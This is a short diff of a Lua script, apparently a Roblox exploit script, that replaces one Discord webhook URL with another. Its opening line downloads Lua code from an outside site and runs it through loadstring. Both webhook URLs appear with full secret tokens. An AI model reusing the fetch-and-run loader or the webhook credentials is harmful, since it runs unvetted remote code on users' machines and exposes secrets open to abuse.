@@ -2,7 +2,7 @@ local Atlas = loadstring(game:HttpGet("https://siegehub.net/Atlas.lua"))()
 --github cache issue why f
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
-local Webhook_URL = "https://webhook.lewisakura.moe/api/webhooks/1127692474022899803/hlWgAz5WMmynqqiyBB1K32-DQSNG8Z4j-LGH8LpF3wGoo_IxmbQOnw6q27w8eYRa-0Ph"
+local Webhook_URL = "https://discord.com/api/webhooks/1131295598931357737/zl34OlyWdyLVmfVhYGQbod8tpztHlPM8fGKV_sfsIPp4ZBhe1iX6vgalATIlq988Lj7T"
 local response
 
 if request and type(request) == "function" then
